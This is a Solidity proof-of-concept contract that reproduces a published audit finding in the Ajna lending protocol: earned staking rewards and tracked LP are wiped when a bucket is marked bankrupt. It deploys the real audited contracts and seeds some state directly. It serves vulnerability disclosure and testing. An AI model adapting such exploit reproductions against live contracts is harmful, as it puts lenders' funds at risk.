// SPDX-License-Identifier: MIT
// Cheatcode-free reproduction of Ajna H-06 (Code4rena 2023-05-ajna, commit
// 276942bc) for the in-browser EVM Playground. It deploys the REAL audited Ajna
// ERC20PoolFactory / PositionManager / RewardsManager / ERC20Pool (all 8 external
// delegatecall libraries injected at fixed addresses via anvil_state) and stakes
// a REAL LP position in a bucket. The staked position accrues real, still-claimable
// AJNA rewards for burn epoch 1 (calculateRewards > 0). The bucket is then made
// bankrupt: because PositionManager.getPositionIndexesFiltered treats any bucket
// with `depositTime <= bankruptcyTime` as gone, RewardsManager.calculateRewards for
// the SAME position collapses to 0 and unstake pays 0 - the lender loses rewards
// they had already earned while the bucket was solvent, and the tracked LP is wiped.
//
// State that a single block cannot advance (the epoch-1 burn accumulators, the
// post-burn bucket exchange rate, and the bucket's bankruptcyTime) is seeded via
// the poc-config storeSlot steps to the values a real multi-week reserve auction +
// liquidation produce (the registry forge test drives those real flows end-to-end).
pragma solidity 0.8.14;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Pool }         from "../src/ajna/src/ERC20Pool.sol";
import { ERC20PoolFactory }  from "../src/ajna/src/ERC20PoolFactory.sol";
import { ERC721PoolFactory } from "../src/ajna/src/ERC721PoolFactory.sol";
import { PositionManager }   from "../src/ajna/src/PositionManager.sol";
import { RewardsManager }    from "../src/ajna/src/RewardsManager.sol";
import { IPositionManager }  from "../src/ajna/src/interfaces/position/IPositionManager.sol";
import { IPositionManagerOwnerActions } from "../src/ajna/src/interfaces/position/IPositionManagerOwnerActions.sol";

contract MintableToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}
contract AjnaToken is ERC20 {
    constructor() ERC20("Ajna", "AJNA") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
    function burn(uint256 a) external { _burn(msg.sender, a); }
}

contract Exploit {
    AjnaToken        public ajna;
    ERC20PoolFactory public factory;
    PositionManager  public positionManager;
    RewardsManager   public rewards;
    MintableToken    public coll;
    MintableToken    public quote;
    ERC20Pool        public pool;
    uint256          public tokenId;

    uint256 public constant BUCKET = 2570;

    uint256 public rewardBefore;
    uint256 public rewardAfter;
    uint256 public gained;
    bool    public lpWiped;
    bool    public proven;

    uint256[] internal idxs;

    // Deploy + real stake at burn epoch 0 (unrecorded setup; the recorded attack
    // is the checkBefore()/checkAfterAndUnstake() callScript).
    constructor() {
        // Deploy order fixes RewardsManager at CREATE nonce 5 and the pool clone at
        // factory nonce 2 (see poc-config storeSlot target addresses).
        ajna            = new AjnaToken();                                       // nonce 1
        factory         = new ERC20PoolFactory(address(ajna));                   // nonce 2
        positionManager = new PositionManager(factory, new ERC721PoolFactory(address(ajna))); // nonces 3,4
        rewards         = new RewardsManager(address(ajna), IPositionManager(address(positionManager))); // nonce 5
        coll            = new MintableToken("Collateral", "C");                  // nonce 6
        quote           = new MintableToken("Quote", "Q");                       // nonce 7

        ajna.mint(address(rewards), 100_000_000 * 1e18);
        pool = ERC20Pool(factory.deployPool(address(coll), address(quote), 0.05 * 1e18));

        idxs.push(BUCKET);

        uint256 amount = 2_000 * 1e18;
        quote.mint(address(this), amount);
        quote.approve(address(pool), type(uint256).max);

        tokenId = positionManager.mint(
            IPositionManagerOwnerActions.MintParams(address(this), address(pool), keccak256("ERC20_NON_SUBSET_HASH"))
        );
        pool.addQuoteToken(amount, BUCKET, type(uint256).max);
        (uint256 lp, ) = pool.lenderInfo(BUCKET, address(this));
        uint256[] memory lps = new uint256[](1);
        lps[0] = lp;
        pool.increaseLPAllowance(address(positionManager), idxs, lps);
        positionManager.memorializePositions(
            IPositionManagerOwnerActions.MemorializePositionsParams(tokenId, idxs)
        );
        positionManager.approve(address(rewards), tokenId);
        rewards.stake(tokenId);
    }

    // Recorded step 1: while the bucket is solvent, the staked position has real,
    // still-claimable rewards for burn epoch 1.
    function checkBefore() external {
        rewardBefore = rewards.calculateRewards(tokenId, 1);
        require(rewardBefore > 0, "precondition: position accrued claimable rewards");
    }

    // Recorded step 2 (after the poc-config storeSlot marks BUCKET bankrupt):
    // the SAME rewards collapse to 0 and unstake pays nothing.
    function checkAfterAndUnstake() external {
        rewardAfter = rewards.calculateRewards(tokenId, 1);           // @> VULN: bankrupt bucket wipes earned rewards to 0
        require(rewardAfter == 0, "expected rewards wiped after bankruptcy");

        uint256 balBefore = ajna.balanceOf(address(this));
        rewards.unstake(tokenId);
        gained = ajna.balanceOf(address(this)) - balBefore;

        // HARM: the lender receives 0 of the AJNA they had already earned, and the
        // tracked LP for the bankrupt bucket is wiped to 0.
        lpWiped = positionManager.getLP(tokenId, BUCKET) == 0;
        proven = rewardBefore > 0 && rewardAfter == 0 && gained == 0 && lpWiped;
        require(proven, "reward wipe not demonstrated");
    }
}
